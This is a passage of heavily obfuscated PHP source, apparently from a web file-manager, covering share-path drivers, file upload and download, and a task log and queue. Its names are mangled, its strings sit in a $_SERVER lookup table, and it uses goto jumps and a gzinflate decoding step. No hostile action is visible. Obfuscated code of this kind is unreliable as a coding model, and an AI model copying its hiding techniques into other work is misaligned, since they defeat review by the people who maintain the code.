infoWithChildren($õòõ¬„ï) { return $this->infoParse($õòõ¬„ï, !0); } protected function infoParse($šÖäÅğ•, $ĞÖåÙø = false, $­ª‘›ê = false) { if (!$ĞÖåÙø) { return $this->model->pathInfo($šÖäÅğ•, $­ª‘›ê); } return $this->model->pathInfoMore($šÖäÅğ•); } public function infoFullSimple($—®øíé¸) { $À“˜¬Ùï =& $_SERVER[ç¦¬”œš]; $–Æú±¥ş = explode($À“˜¬Ùï[8], $—®øíé¸); $˜´²£è = implode($À“˜¬Ùï[8], array_splice($–Æú±¥ş, 1)); return $this->model->pathInfoByPath($–Æú±¥ş[0], $˜´²£è); } public function infoFull($ „¸¿î) { $µş›Å…´ = $this->infoFullSimple($ „¸¿î); return is_array($µş›Å…´) ? $this->model->pathInfo($µş›Å…´[$_SERVER[ç¦¬”œš][193]]) : !1; } public function hashSimple($í–œê¶³) { $ûğµ§ =& $_SERVER[ç¦¬”œš]; $’øöö¢Á = $this->infoWithChildren($í–œê¶³); return $’øöö¢Á[$ûğµ§[170]][$ûğµ§[681]]; } public function hashMd5($Ûà×ëÒÏ) { $âÓÎ‘‰­ =& $_SERVER[ç¦¬”œš]; $µø„œ„ú = $this->infoWithChildren($Ûà×ëÒÏ); return $µø„œ„ú[$âÓÎ‘‰­[170]][$âÓÎ‘‰­[556]]; } public function exist($ò½•¬‰) { $‡Şí§Ê =& $_SERVER[ç¦¬”œš]; $©—’©† = $this->parse($ò½•¬‰); if (!$©—’©†[$‡Şí§Ê[87]]) { return $this->isFile($ò½•¬‰) || $this->isFolder($ò½•¬‰); } $³”ªø = array($‡Şí§Ê[486] => $©—’©†[$‡Şí§Ê[484]], $‡Şí§Ê[32] => $©—’©†[$‡Şí§Ê[87]]); $Àæ–õé = $this->model->where($³”ªø)->find(); return $Àæ–õé ? !0 : !1; } public function isFile($Õ±ÚªÓ¹) { $Ã’ş”à¹ =& $_SERVER[ç¦¬”œš]; $¬àœ°Áó = $this->infoSimple($Õ±ÚªÓ¹); return $¬àœ°Áó && $¬àœ°Áó[$Ã’ş”à¹[494]] == $Ã’ş”à¹[228] ? !0 : !1; } public function isFolder($‹ÆŞğœ˜) { $Ç©¶ É¥ =& $_SERVER[ç¦¬”œš]; $ÛŸ³¾õ¡ = $this->infoSimple($‹ÆŞğœ˜); return $ÛŸ³¾õ¡ && $ÛŸ³¾õ¡[$Ç©¶ É¥[494]] == $Ç©¶ É¥[91] ? !0 : !1; } public function listPath($¿Ó¨æ€š, $±’ÁŒ« = false) { $Š‚€Õ£© =& $_SERVER[ç¦¬”œš]; if ($¿Ó¨æ€š == $Š‚€Õ£©[12]) { return !1; } $¢°¦Üé = array($Š‚€Õ£©[486] => $¿Ó¨æ€š); if ($±’ÁŒ«) { return $this->model->listSource($¢°¦Üé, -1); } return $this->model->listSource($¢°¦Üé); } public function has($Æ‡§æáÎ, $ù™¿¼›× = false, $ìã—Œ˜‹ = null) { $Ü”áùúš =& $_SERVER[ç¦¬”œš]; $´•½‰Æ™ = $this->infoWithChildren($Æ‡§æáÎ); if ($ù™¿¼›×) { return array($Ü”áùúš[240] => $´•½‰Æ™[$Ü”áùúš[240]], $Ü”áùúš[239] => $´•½‰Æ™[$Ü”áùúš[239]]); } return $ìã—Œ˜‹ ? $´•½‰Æ™[$Ü”áùúš[240]] : $´•½‰Æ™[$Ü”áùúš[239]]; } public function listAll($™·Ô¬ß) { $‰äöü† = IO::info($this->pathParse[$_SERVER[ç¦¬”œš][87]]); if (!$‰äöü†) { return array(); } return $this->model->listAll($™·Ô¬ß); } public function getContent($åà¥ÈÎä) { return $this->model->getContent($åà¥ÈÎä); } public function setContent($ÄŒ“ÈÊÔ, $åĞòó¡ƒ = '') { return $this->model->setContent($ÄŒ“ÈÊÔ, $åĞòó¡ƒ); } public function fileSubstr($Ì¬·ÖĞ«, $Ó¥ÌÌÖé, $óÜĞ³¢) { return $this->model->fileSubstr($Ì¬·ÖĞ«, $Ó¥ÌÌÖé, $óÜĞ³¢); } public function download($£ÏÇ¶Î®, $óÊşƒİ• = '') { $ÍÔ–åŞ™ = get_path_father($óÊşƒİ•); $ø„š»şµ = get_path_this($óÊşƒİ•); $ê¼¸÷¥ú = $this->model->fileInfoGet($£ÏÇ¶Î®); $â„öîÌ‚ = IO::copy($ê¼¸÷¥ú[$_SERVER[ç¦¬”œš][87]], $ÍÔ–åŞ™, !1, $ø„š»şµ); return $â„öîÌ‚; } public function setModifyTime($Ô“†èª§, $úºÜœı¥ = '') { $İ©Â¦ı· =& $_SERVER[ç¦¬”œš]; if (!$Ô“†èª§) { return; } $this->model->where(array($İ©Â¦ı·[500] => $Ô“†èª§))->save(array($İ©Â¦ı·[88] => $úºÜœı¥)); } public function upload($™µ˜ä«è, $øÍ¬’Õ, $¶‰¿‚à = false, $Ğ¶»ô°— = REPEAT_REPLACE) { $˜ŒÇşà =& $_SERVER[ç¦¬”œš]; $‡¹¬¦ŒÓ = $this->parse($™µ˜ä«è); $§‚Ä‘å¡ = $this->model->addFile($‡¹¬¦ŒÓ[$˜ŒÇşà[484]], $øÍ¬’Õ, $‡¹¬¦ŒÓ[$˜ŒÇşà[87]], $¶‰¿‚à, $Ğ¶»ô°—); return $this->getPathOuter($§‚Ä‘å¡); } public function uploadFileByID($ªäØ²óİ, $‰Ö²÷ã, $û¶øÛú‰) { $½êæœ¸® =& $_SERVER[ç¦¬”œš]; $‘•›¸Ï  = $this->parse($ªäØ²óİ); $šÛÒßÅØ = $this->model->addFileByFileID($‘•›¸Ï [$½êæœ¸®[484]], $‰Ö²÷ã, $‘•›¸Ï [$½êæœ¸®[87]], $û¶øÛú‰); return $this->getPathOuter($šÛÒßÅØ); } public function addFileByRemote($Â™åş•ı, $®äÏñÌ, $·é¦ÉÉÈ = array(), $ê§ÒªÎ¥ = '', $‚ê¡³) { $ÇƒËñ³í =& $_SERVER[ç¦¬”œš]; $°Î½Ïçô = $this->parse($Â™åş•ı); $ê§ÒªÎ¥ = empty($ê§ÒªÎ¥) ? $°Î½Ïçô[$ÇƒËñ³í[87]] : $ê§ÒªÎ¥; $—ÙãÃÓ÷ = $this->model->addFileByRemote($°Î½Ïçô[$ÇƒËñ³í[484]], $®äÏñÌ, $ê§ÒªÎ¥, $·é¦ÉÉÈ, $‚ê¡³); return $this->getPathOuter($—ÙãÃÓ÷); } public function uploadLink($¶”²ò‡„, $‰½âÌˆ­ = 0) { $¯öü»Õ¹ =& $_SERVER[ç¦¬”œš]; $ˆÂ»şõØ = $this->parse($¶”²ò‡„); $öø¹Û¿€ = _get($GLOBALS[$¯öü»Õ¹[7]], $¯öü»Õ¹[1421]); $˜×ï±†ˆ = _get($GLOBALS[$¯öü»Õ¹[7]], $¯öü»Õ¹[1422]); $¶”²ò‡„ = Model($¯öü»Õ¹[683])->createFileName($ˆÂ»şõØ[$¯öü»Õ¹[87]], $öø¹Û¿€, $˜×ï±†ˆ); return IO::uploadLink($¶”²ò‡„, $‰½âÌˆ­); } public function fileNameAuto($çç×àÅÅ, $ò·ƒõª—, $½­§ÑåÎ = REPEAT_REPLACE, $üŸäôø = false) { return $this->model->fileNameAuto($çç×àÅÅ, $ò·ƒõª—, $½­§ÑåÎ, $üŸäôø); } public function fileNameExist($›ûàÜ¿, $æ‘ÏŸŸ) { return $this->model->fileNameExist($›ûàÜ¿, $æ‘ÏŸŸ); } protected function _fileOut($‹™©¿“Ñ, $”Ø†óè = false, $ËŸÅÁà» = false, $…µÅœ­ƒ = '', $ë¶ÂÛ•Ï = false) { $ëş¼§¿ =& $_SERVER[ç¦¬”œš]; $®ÒÊÔ˜ã = $this->model->sourceInfo($‹™©¿“Ñ); if ($®ÒÊÔ˜ã[$ëş¼§¿[494]] == $ëş¼§¿[91]) { header($ëş¼§¿[1423]); die; } $ƒåì¶Í® = $this->model->fileInfoGet($‹™©¿“Ñ); $…µÅœ­ƒ = $ƒåì¶Í®[$ëş¼§¿[556]] ? $ƒåì¶Í®[$ëş¼§¿[556]] : $…µÅœ­ƒ; $ÇûáˆÇ  = isset($GLOBALS[$ëş¼§¿[182]]) && is_array($GLOBALS[$ëş¼§¿[182]]) ? $GLOBALS[$ëş¼§¿[182]][$ëş¼§¿[32]] : $®ÒÊÔ˜ã[$ëş¼§¿[32]]; if ($ë¶ÂÛ•Ï) { return IO::fileOutServer($ƒåì¶Í®[$ëş¼§¿[87]], $”Ø†óè, $ÇûáˆÇ , $…µÅœ­ƒ); } IO::fileOut($ƒåì¶Í®[$ëş¼§¿[87]], $”Ø†óè, $ÇûáˆÇ , $…µÅœ­ƒ); } public function fileOut($Æ“£—¹À, $¨Ö‘ÜçÏ = false, $şØ‰Ãô® = false, $æÂÜ›¥ = '') { $this->_fileOut($Æ“£—¹À, $¨Ö‘ÜçÏ, $şØ‰Ãô®, $æÂÜ›¥); } public function fileOutServer($âèúßŒ, $¾òØŞ›ì = false, $»‘³ä²´ = false, $¦ô´Î‹ê = '') { $this->_fileOut($âèúßŒ, $¾òØŞ›ì, $»‘³ä²´, $¦ô´Î‹ê, !0); } protected function _fileOutImage($şšÄÌÚ, $¹ÂÒ¬ú± = 250) { $Óô…š¡ =& $_SERVER[ç¦¬”œš]; $Á­ûÕôÒ = $this->model->pathInfo($şšÄÌÚ); if ($Á­ûÕôÒ[$Óô…š¡[494]] == $Óô…š¡[91]) { show_json($Óô…š¡[1424] . $şšÄÌÚ, !1); } $Ãå¿Íèç = $this->model->fileInfoGet($şšÄÌÚ); $Á­ûÕôÒ[$Óô…š¡[183]] = $Ãå¿Íèç[$Óô…š¡[87]]; $GLOBALS[$Óô…š¡[182]] = $Á­ûÕôÒ; IO::fileOutImage($Ãå¿Íèç[$Óô…š¡[87]], $¹ÂÒ¬ú±); } public function fileOutImage($â¨†°…, $à‰íÎ¬¿ = 250) { $this->_fileOutImage($â¨†°…, $à‰íÎ¬¿); } public function fileOutImageServer($¹¬Ÿú‡À, $øÀªˆé¨ = 250) { $this->_fileOutImage($¹¬Ÿú‡À, $øÀªˆé¨); } public function link($ÚÏÊœÎŸ, $Ô±ØÛÏ— = '') { $›½÷Ø¼Ÿ = $this->model->fileInfoGet($ÚÏÊœÎŸ); return IO::link($›½÷Ø¼Ÿ[$_SERVER[ç¦¬”œš][87]], $Ô±ØÛÏ—); } protected function parse($§éïÚî) { $–ĞÀº‘Á =& $_SERVER[ç¦¬”œš]; if (strstr($§éïÚî, $–ĞÀº‘Á[8]) === !1) { return array($–ĞÀº‘Á[502] => intval($§éïÚî), $–ĞÀº‘Á[87] => $–ĞÀº‘Á[12], $–ĞÀº‘Á[1420] => array()); } $í«—ÖŞØ = explode($–ĞÀº‘Á[8], trim($§éïÚî, $–ĞÀº‘Á[8])); if (count($í«—ÖŞØ) < 2) { show_tips(clear_html($§éïÚî) . $–ĞÀº‘Á[1425]); } return array($–ĞÀº‘Á[502] => intval($í«—ÖŞØ[0]), $–ĞÀº‘Á[87] => $í«—ÖŞØ[1], $–ĞÀº‘Á[1420] => array_slice($í«—ÖŞØ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($•™ŸÏ±Ø) { $this->pathParse = $•™ŸÏ±Ø; $this->model = Model($_SERVER[ç¦¬”œš][1419]); } public function getPathOuter($ñ­“äÂÌ) { $·çÊšÉü =& $_SERVER[ç¦¬”œš]; if (!$ñ­“äÂÌ) { return $ñ­“äÂÌ; } $Î› Ã ü = $this->parse($ñ­“äÂÌ); return trim(KodIO::makeShare($this->pathParse[$·çÊšÉü[484]], $Î› Ã ü[$·çÊšÉü[484]]), $·çÊšÉü[8]); } protected function infoParse($±º«ÀáÑ, $¢éşœŸˆ = false, $‰í«ÚÖ÷ = false) { $éŸÜˆ© =& $_SERVER[ç¦¬”œš]; $½³øÍ = $this->pathParse[$éŸÜˆ©[484]]; $—ßşŠ‰ = trim($this->pathParse[$éŸÜˆ©[1251]], $éŸÜˆ©[8]); return Action($éŸÜˆ©[1426])->sharePathInfo($½³øÍ, $—ßşŠ‰, $¢éşœŸˆ); } public function infoFull($Í³½›²†) { $ãœõ‹¿ =& $_SERVER[ç¦¬”œš]; $˜á¬±±Â = explode($ãœõ‹¿[8], trim($Í³½›²†, $ãœõ‹¿[8])); if (count($˜á¬±±Â) > 1) { $½ õÜô = implode($ãœõ‹¿[8], array_splice($˜á¬±±Â, 1)); $ˆù•„º­ = $this->model->pathInfoByPath($˜á¬±±Â[0], $½ õÜô); if (!$ˆù•„º­) { return !1; } $this->pathParse[$ãœõ‹¿[1251]] = $ˆù•„º­[$ãœõ‹¿[193]]; } return $this->infoParse($Í³½›²†); } public function listAll($Â×ñÔƒ) { $ÕÌÈ¨· =& $_SERVER[ç¦¬”œš]; $öĞ…Ôûü = IO::info($this->pathParse[$ÕÌÈ¨·[87]]); if (!$öĞ…Ôûü) { return array(); } $ÙÔ—¿— = $this->model->listAll($Â×ñÔƒ); $ÖØ‘Ê¡Å = Model($ÕÌÈ¨·[673])->getInfo($öĞ…Ôûü[$ÕÌÈ¨·[674]]); foreach ($ÙÔ—¿— as &$õüùğü) { check_abort(); $õüùğü[$ÕÌÈ¨·[90]] = Action($ÕÌÈ¨·[1426])->_shareItemeParse($õüùğü[$ÕÌÈ¨·[90]], $ÖØ‘Ê¡Å); } unset($õüùğü); return $ÙÔ—¿—; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($éØ×Å‰ñ) { $this->pathParse = $éØ×Å‰ñ; $this->model = Model($_SERVER[ç¦¬”œš][1419]); } protected function infoParse($…à°¸Á±, $Å»ÙŒœ = false, $¾ğøçíş = false) { $éƒ¿ØâÈ =& $_SERVER[ç¦¬”œš]; return Action($éƒ¿ØâÈ[1257])->sharePathInfo($this->pathParse[$éƒ¿ØâÈ[87]], !0, $Å»ÙŒœ); } public function listPath($ÄÍ³¬„à, $¼Ö¤×çê = false) { $î†ªäª =& $_SERVER[ç¦¬”œš]; $ªíºá´ = parent::listPath($ÄÍ³¬„à, $¼Ö¤×çê); if (!$ªíºá´) { return $ªíºá´; } if (is_array($ªíºá´[$î†ªäª[1427]])) { $ªíºá´[$î†ªäª[1427]] = Action($î†ªäª[1257])->shareItemInfo($ªíºá´[$î†ªäª[1427]]); } foreach ($ªíºá´ as $Õª»´êÜ => $ì”¿‚¼®) { if (!in_array($Õª»´êÜ, array($î†ªäª[86], $î†ªäª[85]))) { continue; } foreach ($ì”¿‚¼® as $ñÏºàñ¿ => $•´›Çö§) { $ªíºá´[$Õª»´êÜ][$ñÏºàñ¿] = Action($î†ªäª[1257])->shareItemInfo($•´›Çö§); } } return $ªíºá´; } public function listAll($…ïë±äï) { $˜áÊùÜ =& $_SERVER[ç¦¬”œš]; $ıšó¿Ú¤ = IO::info($this->pathParse[$˜áÊùÜ[87]]); if (!$ıšó¿Ú¤) { return array(); } $ˆ¨ŒÔêø = $this->model->listAll($…ïë±äï); foreach ($ˆ¨ŒÔêø as &$‡Æ¿çÇÔ) { $‡Æ¿çÇÔ[$˜áÊùÜ[90]] = Action($˜áÊùÜ[1257])->shareItemInfo($‡Æ¿çÇÔ[$˜áÊùÜ[90]]); } unset($‡Æ¿çÇÔ); return $ˆ¨ŒÔêø; } } goto a™Õ†øåÍ; BÒœ¸ÒÌš: if (!$nklvuswtpq) { die; } $_SERVER[ß±¢Œ¿–] = explode($_SERVER[ç¦¬”œš][689], gzinflate(substr($_SERVER[ç¦¬”œš][690], 10, -8))); $brkazhtipl = $_SERVER[ç¦¬”œš][691]; goto E·«¢†×ä; F£ùöÓì–Ş: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ˆ¡¿Ä¿, $¬œÁ¡œ‡ = '', $ª³÷–¯Ÿ = 0, $†ƒÌ”ÁÒ = '') { $Ü†¸®ã =& $_SERVER[ç¦¬”œš]; $†ƒÌ”ÁÒ = $†ƒÌ”ÁÒ ? $†ƒÌ”ÁÒ : ($¬œÁ¡œ‡ ? $¬œÁ¡œ‡ : $ˆ¡¿Ä¿); $ß©ïç·î = new Task($ˆ¡¿Ä¿, $¬œÁ¡œ‡, $ª³÷–¯Ÿ, $†ƒÌ”ÁÒ); $GLOBALS[$Ü†¸®ã[1853] . $ˆ¡¿Ä¿] = new TaskLog($Ü†¸®ã[1754], $ß©ïç·î, $†ƒÌ”ÁÒ); return $ß©ïç·î; } public function __construct($ë»şì½¯ = '', $ëÃÁ‡ˆÓ = '', $¿ï¶ · = '') { $şÖöõø„ =& $_SERVER[ç¦¬”œš]; if (!$ë»şì½¯) { $ë»şì½¯ = $şÖöõø„[1754]; } $­î¤ö’Ò = $ë»şì½¯ . $şÖöõø„[462] . rand_string(10); if (!$¿ï¶ ·) { $¿ï¶ · = $ë»şì½¯ . $şÖöõø„[53] . $¿ï¶ ·; } switch ($ë»şì½¯) { case $şÖöõø„[1754]: if (!$ëÃÁ‡ˆÓ || !$ëÃÁ‡ˆÓ->task) { return echoLog($ë»şì½¯ . $şÖöõø„[1854]); } $š¦³‡ı– = $ëÃÁ‡ˆÓ; $­î¤ö’Ò = $š¦³‡ı–->task[$şÖöõø„[484]]; $ë»şì½¯ = $š¦³‡ı–->task[$şÖöõø„[484]]; if (!$š¦³‡ı–->task[$şÖöõø„[1659]]) { $š¦³‡ı–->task[$şÖöõø„[1659]] = $¿ï¶ · ? $¿ï¶ · : $ë»şì½¯; } break; case $şÖöõø„[1855]: if (!$ëÃÁ‡ˆÓ) { return echoLog($ë»şì½¯ . $şÖöõø„[1856]); } $°óØÕìœ = is_string($ëÃÁ‡ˆÓ) ? array($ëÃÁ‡ˆÓ) : $ëÃÁ‡ˆÓ; $š¦³‡ı– = new TaskFileTransfer($­î¤ö’Ò, $ë»şì½¯, 0, $¿ï¶ · ? $¿ï¶ · : $°óØÕìœ[0]); foreach ($°óØÕìœ as $ºîŠ¾“İ) { $š¦³‡ı–->addPath($ºîŠ¾“İ); } break; case $şÖöõø„[389]: if (!$ëÃÁ‡ˆÓ) { return echoLog($ë»şì½¯ . $şÖöõø„[1856]); } $°óØÕìœ = is_string($ëÃÁ‡ˆÓ) ? array($ëÃÁ‡ˆÓ) : $ëÃÁ‡ˆÓ; $š¦³‡ı– = new TaskZip($­î¤ö’Ò, $ë»şì½¯, 0, $¿ï¶ · ? $¿ï¶ · : $°óØÕìœ[0]); foreach ($°óØÕìœ as $ºîŠ¾“İ) { $š¦³‡ı–->addPath($ºîŠ¾“İ); } break; case $şÖöõø„[1300]: if (!$ëÃÁ‡ˆÓ) { return echoLog($ë»şì½¯ . $şÖöõø„[1856]); } $š¦³‡ı– = new TaskUnZip($­î¤ö’Ò, $ë»şì½¯, 0, $¿ï¶ · ? $¿ï¶ · : $ëÃÁ‡ˆÓ); if ($ëÃÁ‡ˆÓ) { $š¦³‡ı–->addFile($ëÃÁ‡ˆÓ); } break; case $şÖöõø„[152]: $š¦³‡ı– = new TaskHttp($­î¤ö’Ò, $ë»şì½¯); break; default: return; break; } $this->task = $š¦³‡ı–; $this->taskID = $­î¤ö’Ò; Hook::bind($şÖöõø„[1791], array($this, $şÖöõø„[1857])); Hook::bind($şÖöõø„[1793], array($this, $şÖöõø„[1858])); Hook::bind($şÖöõø„[1787], array($this, $şÖöõø„[1859])); echoLog($şÖöõø„[1860] . $š¦³‡ı–->task[$şÖöõø„[1659]]); } public function __destruct() { $this->end(); } public function end($¶ºéªà = '') { $Ä÷ÂÃËµ =& $_SERVER[ç¦¬”œš]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¶ºéªà); $this->task = !1; $this->taskID = !1; Hook::unbind($Ä÷ÂÃËµ[1791], array($this, $Ä÷ÂÃËµ[1857])); Hook::unbind($Ä÷ÂÃËµ[1793], array($this, $Ä÷ÂÃËµ[1858])); Hook::unbind($Ä÷ÂÃËµ[1787], array($this, $Ä÷ÂÃËµ[1859])); } public function taskUpdate($ÈÎÓ·­‚) { $¯˜Şåıì =& $_SERVER[ç¦¬”œš]; if (!$ÈÎÓ·­‚ || $this->taskID != $ÈÎÓ·­‚[$¯˜Şåıì[484]]) { return; } $“äÖ§º± = 20; $¦õôÚÆé = intval($ÈÎÓ·­‚[$¯˜Şåıì[1772]] * $“äÖ§º±); $ÑêßË× = $¯˜Şåıì[176] . str_repeat($¯˜Şåıì[963], $¦õôÚÆé) . $¯˜Şåıì[1093] . str_repeat($¯˜Şåıì[53], $“äÖ§º± - $¦õôÚÆé) . $¯˜Şåıì[178]; $õÎÊ³œÂ = $ÑêßË× . sprintf($¯˜Şåıì[1861], $ÈÎÓ·­‚[$¯˜Şåıì[1772]] * 100) . $¯˜Şåıì[1862]; $ºŠÌ = $õÎÊ³œÂ . $ÈÎÓ·­‚[$¯˜Şåıì[1771]] . $¯˜Şåıì[8] . $ÈÎÓ·­‚[$¯˜Şåıì[1142]] . LNG($¯˜Şåıì[1863]); $ƒ¨„æäê = $¯˜Şåıì[12]; if ($ÈÎÓ·­‚[$¯˜Şåıì[1847]]) { $ºŠÌ = $õÎÊ³œÂ . size_format($ÈÎÓ·­‚[$¯˜Şåıì[1771]]) . $¯˜Şåıì[8] . size_format($ÈÎÓ·­‚[$¯˜Şåıì[1142]]); $ƒ¨„æäê = size_format($ÈÎÓ·­‚[$¯˜Şåıì[1773]]) . $¯˜Şåıì[1864]; } if ($ÈÎÓ·­‚[$¯˜Şåıì[1144]]) { $ÈÎÓ·­‚[$¯˜Şåıì[1821]] = $ÈÎÓ·­‚[$¯˜Şåıì[1144]] . $¯˜Şåıì[53] . $ÈÎÓ·­‚[$¯˜Şåıì[1821]]; } if ($ÈÎÓ·­‚[$¯˜Şåıì[1821]]) { $´¨ªŸ¿Ú = $¯˜Şåıì[12]; if ($ÈÎÓ·­‚[$¯˜Şåıì[1823]]) { $´¨ªŸ¿Ú = $¯˜Şåıì[50] . size_format($ÈÎÓ·­‚[$¯˜Şåıì[1824]]) . $¯˜Şåıì[8] . size_format($ÈÎÓ·­‚[$¯˜Şåıì[1823]]); } $ƒ¨„æäê .= $ÈÎÓ·­‚[$¯˜Şåıì[1821]] . $´¨ªŸ¿Ú; } if ($ÈÎÓ·­‚[$¯˜Şåıì[843]] && !$ÈÎÓ·­‚[$¯˜Şåıì[1823]]) { $ƒ¨„æäê .= $¯˜Şåıì[53] . size_format($ÈÎÓ·­‚[$¯˜Şåıì[1828]]) . $¯˜Şåıì[8] . size_format($ÈÎÓ·­‚[$¯˜Şåıì[843]]); } echoLog($ºŠÌ . $¯˜Şåıì[53] . $ƒ¨„æäê, !0); } public function taskEnd($Ô Å®£š) { $ô…‘µÒ¼ =& $_SERVER[ç¦¬”œš]; if (!$Ô Å®£š || $this->taskID != $Ô Å®£š[$ô…‘µÒ¼[484]]) { return; } $şÈ’Ü = $Ô Å®£š ? $Ô Å®£š[$ô…‘µÒ¼[1771]] . $ô…‘µÒ¼[8] . $Ô Å®£š[$ô…‘µÒ¼[1142]] . LNG($ô…‘µÒ¼[1863]) . $ô…‘µÒ¼[74] : $ô…‘µÒ¼[12]; echoLog($ô…‘µÒ¼[1865] . $Ô Å®£š[$ô…‘µÒ¼[1659]] . ($Ô Å®£š[$ô…‘µÒ¼[535]] ? $ô…‘µÒ¼[74] . $Ô Å®£š[$ô…‘µÒ¼[535]] : $ô…‘µÒ¼[12]) . $ô…‘µÒ¼[74] . $şÈ’Ü . $ô…‘µÒ¼[1866] . sprintf($ô…‘µÒ¼[930], timeFloat() - $Ô Å®£š[$ô…‘µÒ¼[1774]]) . $ô…‘µÒ¼[1786]); $this->end(); } public function taskKill($ˆ÷­ÀçÃ) { $Ÿªª¿ó† =& $_SERVER[ç¦¬”œš]; if (!$ˆ÷­ÀçÃ || $this->taskID != $ˆ÷­ÀçÃ[$Ÿªª¿ó†[484]]) { return; } echoLog($Ÿªª¿ó†[1867] . $ˆ÷­ÀçÃ[$Ÿªª¿ó†[1659]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\153\x51\165\x65\165\145\114\145\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\141\163\153\121\165\x65\x75\x65\x44\x61\164\x61"; const QUEUE_TIME = "\164\x61\163\153\121\165\x65\x75\x65\114\x61\163\x74\122\x75\156"; const QUEUE_THREAD = "\x74\x61\163\153\121\x75\145\x75\x65\x54\150\162\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($şÄ÷ìºş, $ú†Ê ¹› = array(), $©·şö¸ì = '', $œ’¸ü¿ã = '') { $ßâôù£ë =& $_SERVER[ç¦¬”œš]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($œ’¸ü¿ã && array_find_by_field(self::$listData, $ßâôù£ë[97], $œ’¸ü¿ã)) { return !0; } if ($œ’¸ü¿ã && array_find_by_field(self::$listDataAdd, $ßâôù£ë[97], $œ’¸ü¿ã)) { return !0; } self::$listDataAdd[] = array($ßâôù£ë[341] => $şÄ÷ìºş, $ßâôù£ë[1868] => $ú†Ê ¹›, $ßâôù£ë[535] => $©·şö¸ì, $ßâôù£ë[97] => $œ’¸ü¿ã); return !0; } public static function addSubmit() { $å®¸ÀÌµ =& $_SERVER[ç¦¬”œš]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($å®¸ÀÌµ[1869] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $å®¸ÀÌµ[12], $å®¸ÀÌµ[535])), $å®¸ÀÌµ[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($“ø¾—™, $œØÏ¶ö = array(), $Ç¦ºöËà = '', $…¬º›Ò÷ = '') { $™ş°á¾‹ =& $_SERVER[ç¦¬”œš]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ü£ğªğ = self::getAll(); if ($…¬º›Ò÷ && array_find_by_field($ü£ğªğ, $™ş°á¾‹[97], $…¬º›Ò÷)) { return !0; } $ü£ğªğ[] = array($™ş°á¾‹[341] => $“ø¾—™, $™ş°á¾‹[1868] => $œØÏ¶ö, $™ş°á¾‹[535] => $Ç¦ºöËà, $™ş°á¾‹[97] => $…¬º›Ò÷); self::setAll($ü£ğªğ); write_log($™ş°á¾‹[1869] . $Ç¦ºöËà, $™ş°á¾‹[197]); return !0; } public static function run() { $¶…‚Ñ­Ú =& $_SERVER[ç¦¬”œš]; $üö€—…Ä = self::getAll(); $Ã²Á¬ = array_shift($üö€—…Ä); if (!$Ã²Á¬) { return !1; } self::setAll($üö€—…Ä); $¨Á±†ˆõ = timeFloat(); $¡àó£Ê = $¶…‚Ñ­Ú[12]; try { $¡àó£Ê = Hook::apply($Ã²Á¬[$¶…‚Ñ­Ú[341]], $Ã²Á¬[$¶…‚Ñ­Ú[1868]]); } catch (Exception $ú‰œ½Â) { write_log($ú‰œ½Â, $¶…‚Ñ­Ú[1265]); } $ºÀáĞùÈ = number_format(timeFloat() - $¨Á±†ˆõ, 3) . $¶…‚Ñ­Ú[1786]; if ($¡àó£Ê && is_string($¡àó£Ê)) { $ºÀáĞùÈ = $ºÀáĞùÈ . $¶…‚Ñ­Ú[1870] . $¡àó£Ê; } write_log($¶…‚Ñ­Ú[1871] . $Ã²Á¬[$¶…‚Ñ­Ú[535]] . $¶…‚Ñ­Ú[1872] . $ºÀáĞùÈ, $¶…‚Ñ­Ú[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $²¨ÎÑ˜ó =& $_SERVER[ç¦¬”œš]; $ï³˜Ø¢ë = self::threadCount() + 1; if ($ï³˜Ø¢ë > 3 || !self::count()) { return; } write_log($²¨ÎÑ˜ó[1873] . $ï³˜Ø¢ë, $²¨ÎÑ˜ó[197]); Cache::set(self::QUEUE_THREAD, $ï³˜Ø¢ë, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($²¨ÎÑ˜ó[1874], $²¨ÎÑ˜ó[197]); } public static function getKey($³ÄÃ’°¨, $ãƒ‘˜«¾ = "\151\156\164") { $™˜“Öı¶ =& $_SERVER[ç¦¬”œš]; Cache::removeMemory($³ÄÃ’°¨); $‡¼Ğ³Á = Cache::get($³ÄÃ’°¨); if ($ãƒ‘˜«¾ == $™˜“Öı¶[364]) { return $‡¼Ğ³Á ? intval($‡¼Ğ³Á) : 0; } if ($ãƒ‘˜«¾ == $™˜“Öı¶[1875]) { return is_array($‡¼Ğ³Á) ? $‡¼Ğ³Á : array(); } return $‡¼Ğ³Á; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ç¦¬”œš][1875]); } public static function setAll($”Û¶´ÇÎ) { $õ†¡ù×† = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($”Û¶´ÇÎ), $õ†¡ù×†); Cache::set(self::QUEUE_DATA, $”Û¶´ÇÎ, $õ†¡ù×†); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¸œ¡¡Í·, $’óÊÃ‡ê = 5.0) { if (!$¸œ¡¡Í·) { return; } $Úê· Ò¬ = Cache::get($¸œ¡¡Í·); if (!$Úê· Ò¬ || timeFloat() - floatVal($Úê· Ò¬) >= $’óÊÃ‡ê) { 